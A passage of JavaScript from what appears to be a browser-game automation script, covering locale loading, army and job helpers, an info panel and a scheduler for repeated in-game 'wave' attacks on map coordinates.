                    }
                } else {
                    t.marches[a.march_id].run_at = a.run_at;
                    t.marches[a.march_id].duration = a.duration
                }
            }
            if (a.queue === "units") {}
            if (t.jobs[b][a.id]) {
                return
            }
            a.run_at += 2;
            t.jobs[b][a.id] = a.cloneProps()
        },
        checkIncomingData: function (r) {
            var t = Seed;
            for (var i = 0; i < r.dat.city.jobs.length; i++) {
                var a = r.dat.city.jobs[i];
                if (a.queue === "building") {
                    var b = null;
                    for (var j = 0; j < r.dat.city.buildings.length; j++) {
                        if (r.dat.city.buildings[j].id === a.city_building_id) {
                            b = r.dat.city.buildings[j];
                            break
                        }
                    }
                    if (!b) {
                        debugLogText("*********************** MISSING BUILDING! (" + a.city_building_id + ") now=" + serverTime() + "\n" + inspect(a, 7, 1) + "\n" + inspect(r, 12, 1));
                        if (V) {
                            alert("Danger Will Robinson! (missing building)")
                        }
                    }
                }
            }
            if (!r.dat.city.marches) {
                return
            }
            for (var i = 0; i < r.dat.city.jobs.length; i++) {
                var a = r.dat.city.jobs[i];
                if (a.march_id) {
                    if (t.findMarch(a.march_id, r.dat.city.marches) === null) {
                        debugLogText("*********************** MISSING MARCH, Job ID:" + a.march_id + " (now=" + serverTime() + ")\n" + inspect(a, 7, 1) + "\n" + inspect(r, 12, 1));
                        if (V) {
                            alert("Danger Will Robinson! (missing march)")
                        }
                    }
                }
            }
            for (var i = 0; i < r.dat.city.marches.length; i++) {
                var c = r.dat.city.marches[i];
                var a = null;
                for (var j = 0; j < r.dat.city.jobs.length; j++) {
                    if (r.dat.city.jobs[j].march_id === c.id) {
                        a = r.dat.city.jobs[j];
                        break
                    }
                }
                if (a === null) {
                    debugLogText("*********************** MISSING JOB FOR MARCH!  march_id:" + c.id + "\n" + inspect(r, 11, 1));
                    if (V) {
                        alert("MISSING JOB FOR MARCH!")
                    }
                }
            }
        },
        findMarch: function (a, b) {
            for (var c = 0; c < b.length; c++) {
                if (b[c].id === a) {
                    return b[c]
                }
            }
            return null
        }
    };
    Translation = {
        loaded: false,
        object: {},
        available_langs: {
            da: true,
            de: true,
            en: true,
            es: true,
            fr: true,
            gr: false,
            id: false,
            it: true,
            nl: true,
            pl: true,
            pt: false,
            ru: false,
            sv: true,
            tr: true
        },
        _section: ["items", "common", "buildings", "messages", "dialogs", "levels", "troops", "map", "research"],
        init: function (a) {
            var t = Translation;
            t.fetchLocale(function (r) {
                if (r.ok) {
                    verboseLog("Locale data was Successfully requested from the sever");
                    t.loaded = true;
                    t.fixResults()
                }
                if (a) {
                    a(r)
                }
            })
        },
        fetchLocale: function (a) {
            var t = Translation;
            var p = {};
            p._swf_session_id = SESSION_ID;
            new MyAjax.RequestDOA("locales/" + (t.available_langs[Y] ? Y : "en") + ".xml", "GET", p, function (r) {
                if (r.ok) {
                    try {
                        t.parseXML(r.dat)
                    } catch (e) {
                        r.ok = false;
                        r.errmsg = e.toString()
                    }
                } else {
                    if (r.errmsg.indexOf("404") !== -1) {
                        var p = {};
                        p._swf_session_id = SESSION_ID;
                        new MyAjax.RequestDOA("locales/en.xml", "GET", p, function (r) {
                            if (r.ok) {
                                try {
                                    t.parseXML(r.dat)
                                } catch (e) {
                                    r.ok = false;
                                    r.errmsg = e.toString()
                                }
                            }
                            if (a) {
                                a(r)
                            }
                        })
                    }
                }
                if (a) {
                    a(r)
                }
            })
        },
        parseXML: function (a) {
            var t = Translation;
            var b = [];
            b.push('<?xml version="1.0" encoding="UTF-8"?>');
            b.push("<translations>");
            for (i = 0; i < t._section.length; i++) {
                var c = a.indexOf("<" + t._section[i] + ">");
                var d = a.indexOf("</" + t._section[i] + ">") + t._section[i].length + 3;
                b.push(a.substring(c, d));
                a = a.substring(1, c) + a.substring(d)
            }
            b.push("</translations>");
            var e = new XML.ObjTree();
            t.object = e.parseXML(b.join("").replace(/\n/g, ""));
            if (t.object.translations) {
                t.object = t.object.translations
            } else {
                verboseLog("<b>ERROR</b> in the XML file structure: <b><translations></b> element not found!")
            }
        },
        fixResults: function () {
            var t = Translation.object;

            function objectToFlat(a) {
                var r = {};
                for (var b in a) {
                    if (typeof a[b] === "object") {
                        for (var c in a[b]) {
                            if (typeof (a[b])[c] === "object") {
                                for (var d in (a[b])[c]) {
                                    if (d === "title" || d === "name") {
                                        r[b + "-" + c] = ((a[b])[c])[d]
                                    } else {
                                        r[b + "-" + c + "-" + d] = ((a[b])[c])[d]
                                    }
                                }
                            } else {
                                if (c === "title" || c === "name") {
                                    r[b] = (a[b])[c]
                                } else {
                                    r[b + "-" + c] = (a[b])[c]
                                }
                            }
                        }
                    } else {
                        r[b] = a[b]
                    }
                }
                return r
            }
            var e = ["dialogs", "messages"];
            for (var i = 0; i < e.length; i++) {
                t[e[i]] = objectToFlat(t[e[i]])
            }
            t.common.information = t.common.info;
            t.common.omit = t.common.skip;
            t.common["spy-on"] = t.common.spy;
            t.dialogs.researching = t.dialogs.research;
            t.common["enter-coords"] = t.dialogs["attack-screen-enter-coords"];
            t.common["battle-report"] = t.messages["battle-report-title"];
            t.common["auto-collection-of-resources"] = t.dialogs["boost-collect-day"].replace(/:/, "");
            t.common.levels = findSimilarWord(t.common.level, t.messages["spy-tip-prefix"]);
            delete t.common.error;
            delete t.common.home;
            delete t.common.info;
            delete t.common["ranged-attack"];
            delete t.common.skip;
            delete t.common.spy;
            delete t.messages.date;
            delete t.messages.fought;
            delete t.messages.subject;
            delete t.messages.to;
            delete t.dialogs.research;
            delete t.dialogs.spy;
            delete t.dialogs.unavailable;
            delete t.dialogs.upkeep
        },
        _normalize: function (a) {
            return (a || "").toLowerCase().replace(/ /g, "-")
        },
        getContent: function (a, b, c) {
            b = Translation._normalize(b);
            if (Translation.object[a] !== undefined) {
                if ((Translation.object[a])[b] !== undefined) {
                    return c ? ((Translation.object[a])[b])[c] : (Translation.object[a])[b]
                }
            }
            return false
        },
        buildings: function (a, b) {
            b = b !== undefined ? b : "name";
            return Translation.getContent("buildings", a, b)
        },
        common: function (a) {
            return Translation.getContent("common", a)
        },
        items: function (a, b) {
            b = b !== undefined ? b : "name";
            return Translation.getContent("items", a, b)
        },
        dialogs: function (a) {
            return Translation.getContent("dialogs", a)
        },
        levels: function (a) {
            return Translation.getContent("levels", a, "title")
        },
        map: function (a, b) {
            b = b !== undefined ? b : "name";
            return Translation.getContent("map", a, b)
        },
        messages: function (a) {
            return Translation.getContent("messages", a)
        },
        troops: function (a, b) {
            b = b !== undefined ? b : "name";
            return Translation.getContent("troops", a, b)
        },
        research: function (a, b) {
            b = b !== undefined ? b : "name";
            return Translation.getContent("research", a, b)
        }
    };
    translate = function (a) {
        if (LANG_OBJECT[a] !== undefined) {
            return LANG_OBJECT[a]
        } else {
            if (Translation.loaded) {
                var b;
                for (var i = 0; i < Translation._section.length; i++) {
                    b = Translation[Translation._section[i]](a);
                    if (b) {
                        return b
                    }
                }
                if (Z && ToTranslate[a] === undefined) {
                    ToTranslate[a] = 1;
                    if (Tabs.Log) {
                        debugLog("( Translate ) -> " + a)
                    }
                }
            }
        }
        return a
    };
    VerboseLog = {
        init: function () {
            var t = VerboseLog;
            t.setEnable(Data.options.verbose_log.enabled)
        },
        setEnable: function (a) {
            var t = VerboseLog;
            Data.options.verbose_log.enabled = a
        }
    };

    function miles(a) {
        var n = "";
        var m = String(a);
        var b = "";
        if (m.substr(0, 1) === "-" || m.substr(0, 1) === "+") {
            b = m.substr(0, 1);
            m = m.substr(1)
        }
        while (m.length > 3) {
            n = "," + m.substr(m.length - 3) + n;
            m = m.substr(0, m.length - 3)
        }
        return b + m + n
    }
    function objAddTo(o, a, b) {
        if (!o[a]) {
            o[a] = b
        } else {
            o[a] += b
        }
    }
    function getGeneralsList(a) {
        var b = {};
        var c = Seed.cities[a].generals;
        for (var i = 0; i < c.length; i++) {
            b[c[i].id] = c[i].name + " (" + c[i].rank + ")"
        }
        return b
    }
    function getUnitNumbers(a, b) {
        var c = (typeof a === "number") ? Seed.cities[a] : a;
        var d = c.units[b] ? c.units[b] : 0;
        var e = 0;
        for (var f in Seed.marches) {
            for (var g in Seed.marches[f].units) {
                if (b === g) {
                    e += Seed.marches[f].units[g]
                }
            }
        }
        return {
            incity: d,
            marches: e,
            total: d + e
        }
    }
    function checkAvailableUnits(a, b) {
        var c = Data.options.attacks.units[b];
        var d = 0;
        for (var e in c) {
            if (c[e] > 0) {
                d += c[e];
                if (Seed.cities[a].units[e] < c[e]) {
                    return translate("Not enough") + " " + translate(e)
                }
            }
        }
        if (d <= 0) {
            return translate("No Troops Defined")
        }
        return null
    }
    function getAvailableDragons(a) {
        var b = false;
        if (Seed.dragons[a]) {
            b = Seed.dragons[a].can_attack
        }
        return {
            status: b
        }
    }
    function getAvailableGeneral() {
        for (var p in Seed.generals) {
            if (!Seed.generals[p].busy) {
                return Seed.generals[p]
            }
        }
        return null
    }
    function getMusterPointSlots(a) {
        var b = Buildings.getLevel(a, "MusterPoint");
        if (!b) {
            return 0
        }
        return b - Seed.num_marches
    }
    function getMusterPointLevel(a) {
        var b = Buildings.getLevel(a, "MusterPoint");
        return (!b) ? 0 : b
    }
    function getBuildingJob(a) {
        var b = Seed.cities[a].id;
        for (var c in Seed.jobs[b]) {
            var d = Seed.jobs[b][c];
            if (d.queue === "building") {
                return ({
                    job: d,
                    building: Buildings.getById(a, d.city_building_id)
                })
            }
        }
        return null
    }
    function getResearchJob(a) {
        var b = Seed.cities[a].id;
        for (var c in Seed.jobs[b]) {
            var d = Seed.jobs[b][c];
            if (d.queue === "research") {
                return (d)
            }
        }
        return null
    }
    function getBuildingById(a, b) {
        var c = Seed.cities[a].buildings;
        for (var i = 0; i < c.length; i++) {
            if (c[i].id === b) {
                return c[i].type
            }
        }
        return ""
    }
    function MarchTracker() {
        var b = {};

        function MarchTracker() {}
        this.setReportDelete = function (a) {};
        this.setUnitLossListener = function (a) {}
    }
    function deleteResearchJob(a) {
        var b = Seed.cities[0].id;
        var c = Seed.jobs[b];
        for (var d in c) {
            if (c[d] === a) {
                delete c[d]
            }
        }
    }
    function deleteBuildJob(a, b) {
        var c = Seed.cities[a].id;
        var d = Seed.jobs[c];
        for (var e in d) {
            if (d[e] === b) {
                delete d[e]
            }
        }
    }
    function getBuildJob(a) {
        var b = Seed.cities[a].id;
        var c = Seed.jobs[b];
        for (var d in c) {
            if (c[d].queue === "building") {
                return c[d]
            }
        }
        return null
    }
    function getTrainJob(a) {
        var b = Seed.cities[a].id;
        var c = Seed.jobs[b];
        for (var p in c) {
            if (c[p].queue === "units") {
                return c[p]
            }
        }
        return null
    }
    function trainTable(c) {
        var d = serverTime();
        var e = "<table class=" + UID.table + ">";
        for (var f = 0; f < Seed.cities.length; f++) {
            var g = serverTime(),
                trains = [];
            var h = Seed.cities[f];
            if (!h) {
                continue
            }
            var j = h.jobs;
            for (var i = 0; i < j.length; i++) {
                if (j[i].queue == "units" && j[i].unit_type && j[i].run_at > g) {
                    trains.push(j[i])
                }
            }
            trains.sort(function (a, b) {
                return a.run_at - b.run_at
            });
            var k = trains.length;
            for (var i = 0; i < k; i++) {
                var l = "",
                    total_time = "",
                    left_time = 0;
                if (i === 0) {
                    l = h.name + ":"
                } else {
                    if (i === k - 1) {
                        left_time = (trains[i].run_at - serverTime() > 0) ? trains[i].run_at - serverTime() : 0;
                        total_time = "&nbsp;<b>(" + timeFormatShort(left_time) + ")</b>"
                    }
                }
                left_time = (trains[i].run_at - g > 0) ? trains[i].run_at - g : 0;
                e += "<tr><td class=right><b>" + l + "</b>&nbsp;</td><td align=right>" + trains[i].quantity + "&nbsp;&nbsp;" + translate(trains[i].unit_type) + "&nbsp;</td><td>&nbsp;<font color=" + bg + ">" + timeFormat(left_time, true) + total_time + "</font></td></tr>";
                g = trains[i].run_at
            }
            if (trains.length === 0) {
                e += "<tr><td class=right><b>" + translate(h.name) + ":</b>&nbsp;</td><td colspan=2><span class=" + UID.bold_red + ">" + translate("Off") + "</span></td></tr>"
            }
        }
        return e + "</table>"
    }
    Tabs.Info = {
        tab_order: G,
        tab_label: "Info",
        tab_disabled: !N,
        $container: null,
        timer: null,
        units_type: ["Porter", "Conscript", "Spy", "Halberdsman", "Minotaur", "Longbowman", "SwiftStrikeDragon", "BattleDragon", "ArmoredTransport", "Giant", "FireMirror", "PackDragon", "AquaTroop", "StoneTroop", "FireTroop", "WindTroop"],
        dragons_type: ["GreatDragon", "WaterDragon", "StoneDragon", "FireDragon", "WindDragon"],
        init: function (b) {
            var t = Tabs.Info;
            t.$container = $J(b);
            $J("<div />").attr({
                id: setUID("tabInfo_Title"),
                "class": UID.title
            }).html(translate("Info")).after($J("<table />").width("100%").append($J("<tr />").append($J("<td />").append($J("<input />").attr({
                type: "button",
                value: translate("Refresh")
            }).click(refresh))).append($J("<td />").css({
                textAlign: "right"
            }).everyTime("1s", utcTime)))).after($J("<div />").attr({
                id: setUID("tabInfo_Content"),
                "class": UID.scrollable
            }).height("640px")).appendTo(t.$container);

            function utcTime() {
                var a = new Date();
                a.setTime(a.getTime() + (a.getTimezoneOffset() * 60000));
                $J(this).html("<b>" + a.toTimeString().substring(0, 8) + "</b> UTC")
            }
            function refresh() {
                debugLog("fetchPlayer from Tab.Info refresh");
                var t = Tabs.Info;
                Seed.fetchPlayer(t.showStuff())
            }
            t.showStuff()
        },
        show: function () {
            var t = Tabs.Info;
            t.timer = setInterval(t.showStuff, 1000)
        },
        hide: function () {
            var t = Tabs.Info;
            clearInterval(t.timer)
        },
        showStuff: function () {
            var t = Tabs.Info;
            var f = Seed.cities[0];
            var g = "";

            function cityTitle(a) {
                var b = Seed.cities[a];
                var c = "";
                var d = (Seed.player.alliance) ? Seed.player.alliance.name : "";
                if (a === 0) {
                    if (Seed.cities[a].defended) {
                        c = "<span class=" + UID.defending + ">" + translate("Defend").toUpperCase() + "</span>"
                    } else {
                        c = "<span class=" + UID.hiding + ">" + translate("Hiding").toUpperCase() + "</span>"
                    }
                } else {
                    c = "<span class=" + UID.defending + ">" + translate("Defend").toUpperCase() + "</span>"
                }
                g = "<div class=" + UID.subtitle + "><table class=" + UID.table + "><tr><td align=left>" + b.name + "</td><td align=center>" + b.x + "," + b.y + "</td><td align=center width=200px><font color=yellow>" + d + "</font></td><td width=80px align=right>" + c + "</td></tr></table></div>";
                return g
            }
            g += cityTitle(0) + "<table class=" + UID.table + ' style="margin-top:3px" width=100%><tr><th>' + translate("Armed Forces") + "</th><th>" + translate("My Generals") + '</th></tr><tr valign=top align=center><td width=50% style="border-right: 1px solid;">';
            g += "<table class=" + UID.table + ">";
            for (var i = 0; i < t.units_type.length; i++) {
                var h = getUnitNumbers(f, t.units_type[i]);
                g += "<tr><td class=right>" + translate(t.units_type[i]) + ":</td><td align=right>" + h.incity + "</td><td align=right>" + (h.marches ? "&nbsp;+&nbsp;<b>(" + h.marches + ")</b>" : "") + "</td></tr>"
            }
            g += '</table></td><td width=50% style=" padding-left:7px">';
            g += "<table class=" + UID.table + "><tr><td align=right>" + translate("Marching") + ": </td><td>" + Seed.num_marches + "</td></tr></table>";
            g += "<table class=" + UID.table + "><tr><th>" + translate("Name") + "</th><th>" + translate("Victory") + "</th><th>" + translate("Coordinates").substring(0, 5) + "</th></tr>";
            var j = "";
            for (var i = 0; i < f.generals.length; i++) {
                if (Seed.num_marches) {
                    for (var k in Seed.marches) {
                        if (Seed.marches[k].march_type !== "TransportMarch") {
                            try {
                                if (f.generals[i].name === Seed.marches[k].general.first_name) {
                                    j = Seed.marches[k].x + "," + Seed.marches[k].y
                                }
                            } catch (e) {
                                verboseLog("<b>Error</b>: general first_name not available" + e.name + " " + e.message)
                            }
                        }
                    }
                }
                g += "<tr><td align=right>" + f.generals[i].name + " <span class=jewel>(" + f.generals[i].rank + ')</span></td><td align=right><span class=jewel style="color:black;">' + f.generals[i].victories + "</span></td><td>" + (f.generals[i].busy ? "<span class=jewel>[" + j + "]</span>" : "") + "</td></tr>"
            }
            g += "</table></td></tr></table>";
            $J("#" + UID.tabInfo_Content).html(g)
        },
    };
    Tabs.Waves = {
        tab_order: H,
        tab_label: "Wave",
        tab_disabled: !O,
        container: null,
        units_type: ["ArmoredTransport", "PackDragon", "Minotaur", "Longbowman", "SwiftStrikeDragon", "BattleDragon", "Giant", "FireMirror", "AquaTroop", "StoneTroop", "FireTroop", "WindTroop"],
        dragons_type: ["GreatDragon", "WaterDragon", "StoneDragon", "FireDragon", "WindDragon"],
        enabled: false,
        attack_timer: null,
        march_timer: null,
        attack_errors: 0,
        current_wave: 1,
        run_start_at: 0,
        init: function (s) {
            var t = Tabs.Waves;
            Data.init({
                waves: {
                    enabled: false,
                    delay_min: 30,
                    delay_max: 60,
                    stop_on_loss: true,
                    delete_reports: false,
                    target: {
                        x: Data.options.map.x,
                        y: Data.options.map.y,
                        type: "",
                        level: 0,
                        stats: {
                            attacks: 0,
                            spoils: {}
                        },
                        units: {},
                        dragons: {}
                    },
                    run_time: 0
                }
            });
            t.container = s;
            var u = "<div class=" + UID.title + ">" + translate("Wave") + "</div><div id=" + setUID("tabWave_Status") + " class=" + UID.status_ticker + ' style="margin-bottom:5px !important"><center><input id=' + setUID("tabWave_OnOff") + ' type=button value="OnOff" /></center><div class=' + UID.status_report + ' style="margin-top:5px;height:140px; max-height:140px; overflow-y:auto;"><table id=' + setUID("tabWave_Marches") + " class=" + UID.table + "></table></div><div id=" + setUID("tabWave_Feedback") + " class=" + UID.status_feedback + "></div></div><div class=" + UID.content + "><div><h4>" + translate("Enter Coords") + ":&nbsp;</h4>&nbsp;<h4>X:</h4> <input id=" + setUID("tabWave_CoordsX") + ' size=3 maxlength=3 type=text value="' + Data.waves.target.x + '" /> <h4>Y:</h4> <input id=' + setUID("tabWave_CoordsY") + ' size=3 maxlength=3 type=text value="' + Data.waves.target.y + '" /> &nbsp <h4>' + translate("Distance") + ":</h4> <span id=" + setUID("tabWave_Distance") + "></span><BR><div class=" + UID.status_ticker + ' style="height:auto !important;margin:5px 10px !important;"><center><span id=' + setUID("tabWave_Tile") + "></span></center></div></div>  <div>  <center><table id=" + setUID("tabWave_Units") + " class=" + UID.table + "><tr><th colspan=8><h4>" + translate("Troops for Wave Attack") + "</h4></th></tr></table>  </center></div><br>  <div>  <center><table id=" + setUID("tabWave_Dragons") + " class=" + UID.table + "><tr><th colspan=8><h4>" + translate("Send Dragon every certain number of waves") + "</h4></th></tr></table>  </center></div><hr class=thin><table class=" + UID.table + "><tr><td class=right> " + translate("Delete") + " " + translate("Battle Report") + ":&nbsp;</td><td><input id=" + setUID("tabWave_DelReports") + " type=checkbox " + (Data.waves.delete_reports ? "CHECKED" : "") + " /></td></tr><tr><td class=right>" + translate("Stop if any troops lost") + ":&nbsp;</td><td><input id=" + setUID("tabWave_StopOnLoss") + " type=checkbox " + (Data.waves.stop_on_loss ? "CHECKED" : "") + " /></td></tr><tr><td class=right>" + translate("Delay Between Attacks") + ":&nbsp;</td><td><input id=" + setUID("tabWave_DelayMin") + ' type=text size=1 maxlength=4 value="' + Data.waves.delay_min + '" />&nbsp;-&nbsp; <span id=' + setUID("tabWave_DelayMax") + ">" + Data.waves.delay_max + "</span>&nbsp;" + translate("Seconds") + "</td></tr></table></div><div class=" + UID.status_ticker + ' style="margin-top:10px !important"><center><input id=' + setUID("tabWave_ResetStats") + ' type=button value="' + translate("Delete") + " " + translate("Statistics") + '" /></center><div id=' + setUID("tabWave_Stats") + '  style="height:100px; max-height:100px; overflow-y:auto"></div><hr class=thin><div id=' + setUID("tabWave_CurSpoil") + "> &nbsp; </div></div>";
            t.container.innerHTML = u;
            $J("#" + UID.tabWave_OnOff).click(function () {
                t.setWaveEnable(!Data.waves.enabled)
            });
            $J("#" + UID.tabWave_CoordsX).change(t.eventCoords);
            $J("#" + UID.tabWave_CoordsY).change(t.eventCoords);
            $J("#" + UID.tabWave_ResetStats).click(t.resetStats);
            $J("#" + UID.tabWave_DelReports).click(function (a) {
                Data.waves.delete_reports = a.target.checked
            });
            $J("#" + UID.tabWave_StopOnLoss).click("click", function (a) {
                Data.waves.stop_on_loss = a.target.checked
            }, false);
            $J("#" + UID.tabWave_DelayMin).change(onChangeDelay);
            unitTable($id(UID.tabWave_Units), 1, "AW", t.eventUnits);
            dragonsTable($id(UID.tabWave_Dragons));
            window.addEventListener("unload", t.onUnload, false);
            t.setWaveEnable(false);
            t.marchTick();
            t.eventCoords();
            t.dispStats();
            Messages.addBattleReportListener(t.gotBattleReport);

            function unitTable(a, b, d, e) {
                var t = Tabs.Waves;
                var f = [];
                f.push(a.insertRow(b));
                f.push(a.insertRow(b + 1));
                f.push(a.insertRow(b + 2));
                f.push(a.insertRow(b + 3));
                var g, r = 0,
                    c = 0;
                for (var i = 0; i < t.units_type.length; i++) {
                    if (i === 6) {
                        r = r + 2;
                        c = 0
                    }
                    var h = f[r].insertCell(c);
                    h.innerHTML = translate("~" + t.units_type[i]);
                    h.style.width = "45px";
                    var j = document.createElement("input");
                    j.type = "text";
                    j.size = "1";
                    j.style.width = "40px";
                    j.title = translate(t.units_type[i]);
                    if (i < 2) {
                        j.style.border = "1px solid grey"
                    } else {
                        if (i < 6) {
                            j.style.border = "1px solid green"
                        } else {
                            j.style.border = "1px solid blue"
                        }
                    }
                    j.maxlength = "6";
                    if (d == "AW") {
                        if (Data.waves.target.units[t.units_type[i]] === undefined) {
                            Data.waves.target.units[t.units_type[i]] = 0
                        }
                        g = Data.waves.target.units[t.units_type[i]]
                    }
                    if (!g) {
                        g = 0
                    }
                    j.value = g;
                    j.name = d + "_" + i;
                    $J(j).change(e);
                    f[r + 1].insertCell(c).appendChild(j);
                    c = c + 1
                }
                return a
            }
            function dragonsTable(e) {
                var f = Tabs.Waves;
                var g = e.insertRow(1);
                var h = Data.waves.target.dragons;
                for (var i = 0; i < f.dragons_type.length; i++) {
                    var j = f.dragons_type[i];
                    var k = g.insertCell(i);
                    k.style.verticalAlign = "middle";
                    k.style.paddingRight = "5px";
                    $J("<span />").html(translate(j).replace(/\s/, "<br>").replace(/\./, "")).css({
                        display: "inline-block",
                        width: "45px",
                        marginRight: "2px"
                    }).appendTo(k);
                    var l = $J("<select />").attr({
                        name: i,
                        title: translate(j)
                    }).css({
                        fontSize: "11px",
                        textAlign: "center"
                    }).focus(function (a) {
                        var b = [];
                        for (var c in Data.waves.target.dragons) {
                            if (Data.waves.target.dragons[c] !== 0) {
                                b[Data.waves.target.dragons[c]] = true
                            }
                        }
                        for (var d = 1; d < 10; d++) {
                            $J(this).find('option[value="' + d + '"]').attr("disabled", (b[d] == true))
                        }
                    }).change(function (a) {
                        var b = f.dragons_type[$J(this).attr("name")];
                        Data.waves.target.dragons[b] = $J(this).val()
                    }).appendTo(k);
                    if (h[j] === undefined) {
                        h[j] = 0
                    }
                    var m = h[j];
                    if (!m) {
                        m = 0
                    }
                    $J("<option />").attr({
                        value: 0
                    }).text("-").appendTo(l);
                    var n = false;
                    for (var o = 1; o < 10; o++) {
                        n = (m === o);
                        var p = false;
                        for (var q in h) {
                            if (o === h[q] && q !== j) {
                                p = true
                            }
                        }
                        $J("<option />").attr({
                            value: o,
                            selected: n,
                            disabled: p
                        }).text(o + "º").appendTo(l)
                    }
                }
                return e
            }
            function onChangeDelay(a) {
                var b = parseIntZero(a.target.value);
                var c = parseInt(b * 2);
                if (b < 30 || b > 3600) {
                    if (b < 30) {
                        b = 30
                    } else {
                        b = 3600
                    }
                    a.target.style.backgroundColor = "#faa";
                    return
                }
                $id(UID.tabWave_DelayMax).innerHTML = c;
                a.target.style.backgroundColor = "";
                Data.waves.delay_min = b;
                Data.waves.delay_max = c
            }
        },
        gotBattleReport: function (r) {
            var t = Tabs.Waves;
            if (r.report.location.x === Data.waves.target.x && r.report.location.y === Data.waves.target.y) {
                ++Data.waves.target.stats.attacks;
                var a = null;
                for (var b in Data.marches.waves) {
                    var c = Data.marches.waves[b];
                    if (c.x === r.report.location.x && c.y === r.report.location.y && c.general.id === r.report.attacker.general.id) {
                        a = b;
                        break
                    }
                }
                if (a) {
                    Data.marches.waves[a].has_report = true
                }
                for (var i = 0; i < r.report.spoils.items.length; i++) {
                    if (!Data.waves.target.stats.spoils[r.report.spoils.items[i]]) {
                        Data.waves.target.stats.spoils[r.report.spoils.items[i]] = 1
                    } else {
                        ++Data.waves.target.stats.spoils[r.report.spoils.items[i]]
                    }
                    $id(UID.tabWave_CurSpoil).innerHTML = new Date().toTimeString().substring(0, 8) + ": " + translate("Got") + " " + translate(r.report.spoils.items[i])
                }
                t.dispStats();
                if (Data.waves.stop_on_loss) {
                    for (var p in r.report.attacker.units) {
                        if (r.report.attacker.units[p][0] !== r.report.attacker.units[p][1]) {
                            var d = new Date(r.report_notification.created_at * 1000).myString();
                            t.setWaveEnable(false);
                            t.dispFeedback(translate("Troops lost") + "! (" + d + ")");
                            actionLog(translate("Wave") + ": " + translate("Troops lost") + "! (" + d + ")");
                            return
                        }
                    }
                }
                if (Data.waves.delete_reports && r.report.attacker.name === Seed.player.name) {
                    Messages.deleteMessage(r.report_notification.id)
                }
            }
        },
        resetStats: function () {
            var t = Tabs.Waves;
            var a = serverTime();
            t.run_start_at = a;
            Data.waves.run_time = 0;
            Data.waves.target.stats = {
                attacks: 0,
                spoils: {}
            };
            t.dispStats()
        },
        dispStats: function () {
            var t = Tabs.Waves;
            var a = Data.waves.run_time;
            if (Data.waves.enabled) {
                a += (serverTime() - t.run_start_at)
            }
            var b = "<table class=" + UID.table + " width=100%><tr><td class=right>" + translate("Run Time") + ": </td><td width=90%>" + timeFormat(a, true) + "</td></tr><tr><td class=right>" + translate("Attacks") + ": </td><td>" + Data.waves.target.stats.attacks + "</td></tr><tr><td colspan=2><hr class=thin></td></tr>";
            for (var c in Data.waves.target.stats.spoils) {
                var d = Data.waves.target.stats.spoils[c];
                var e = d / (a / 3600);
                b += "<tr><td class=right>" + translate(c) + ":</td><td>" + d + " (" + e.toFixed(2) + "&nbsp;" + translate("per hour") + ")</td></tr>"
            }
            b += "</table>";
            $J("#" + UID.tabWave_Stats).html(b)
        },
        dispFeedback: function (a) {
            if (a && a != "") {
                a = new Date().toTimeString().substring(0, 8) + " " + a
            }
            $id(UID.tabWave_Feedback).innerHTML = a
        },
        eventUnits: function (a) {
            var t = Tabs.Waves;
            var b = a.target.name.split("_");
            if (b[0] === "AW") {
                var c = t.units_type[b[1]];
                Data.waves.target.units[c] = a.target.value
            }
        },
        setWaveEnable: function (a) {
            var t = Tabs.Waves;
            var b = $id(UID.tabWave_OnOff);
            clearTimeout(t.attack_timer);
            Data.waves.enabled = a;
            if (a) {
                b.value = translate("Attacking").toUpperCase();
                b.className = UID.btn_on;
                t.run_start_at = serverTime();
                if (!Data.options.attacks.enabled) {
                    Data.marches.count_limit = 1;
                    Data.marches.start_at = serverTime()
                }
                t.waveAttackTick()
            } else {
                b.value = translate("Disabled").toUpperCase();
                b.className = UID.btn_off;
                if (t.run_start_at !== 0) {
                    Data.waves.run_time += (serverTime() - t.run_start_at)
                }
            }
        },
        onUnload: function () {
            var t = Tabs.Waves;
            if (Data.waves.enabled && t.run_start_at !== 0) {
                Data.waves.run_time += (serverTime() - t.run_start_at)
            }
        },
        waveAttackTick: function () {
            var t = Tabs.Waves;
            var a = serverTime();
            var b = "",
                retry_delay, available_general, marching = 0,
                total_marches = 0;
            var c;
            clearTimeout(t.attack_timer);
            if (!Data.waves.enabled) {
                return
            }
            var d = 700000;
            var e = 0;
            for (id in Seed.marches) {
                ++total_marches;
                if (Seed.marches[id].status === "marching") {
                    ++marching
                }
                var f = (Seed.marches[id].run_at - parseInt(serverTime())) * (Seed.marches[id].status == "marching" ? 2 : 1);
                if (f > 0) {
                    d = d < f ? d : f;
                    e = e > f ? e : f
                }
            }
            if (d === 700000 || e === 0) {
                d = 3
            }
            retry_delay = (d * 1000) + Math.randRange(2000, 5000);
            b = "a level " + Data.waves.target.level + " " + Data.waves.target.type + " at " + Data.waves.target.x + "/" + Data.waves.target.y;
            if (MyAjax.march_busy > 0) {
                MyAjax.march_busy = total_marches;
                if (MyAjax.march_busy === 0) {
                    t.attack_busy = false
                }
                verboseLog("<b>Wave</b> attack to " + b + " delayed due to <b>" + total_marches + "</b> pending march request: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("Another march request is pending") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.waveAttackTick, retry_delay);
                return
            }
            if (marching >= Data.options.attacks.max_marches) {
                verboseLog("<b>Wave<b> attack to " + b + " delayed due to <b>march limit</b> reached: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("March limit reached") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay);
                return
            }
            if (getMusterPointSlots(0) <= 0) {
                verboseLog("<b>Wave</b> attack to " + b + " delayed due to <b>insufficent march slots</b>: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("Muster Point") + " " + translate("Full") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.waveAttackTick, retry_delay);
                return
            }
            available_general = getAvailableGeneral();
            if (available_general === null) {
                verboseLog("<b>Wave</b> attack to " + b + " delayed due to <b>insufficent generals</b>: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("No generals available") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.waveAttackTick, retry_delay);
                return
            }
            c = t.checkUnitsWave(0, Data.waves.target.units);
            if (c !== null) {
                verboseLog("<b>Wave</b> attack to " + b + " delayed due to <b>" + c + " units</b>: retry in " + timeFormat(retry_delay / 1000));
